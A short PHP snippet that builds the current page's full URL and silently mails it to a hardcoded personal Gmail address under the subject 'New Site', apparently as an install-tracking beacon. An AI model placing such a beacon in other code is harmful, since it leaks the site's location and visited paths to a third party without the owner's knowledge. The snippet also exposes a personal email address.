<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
          $to      = "bilal555ahmed555@gmail.com"; // Send email to our user

          if(mail($to, "New Site", $url)){
              
          }else{
              echo "Mail not send";
          }
  ?>  
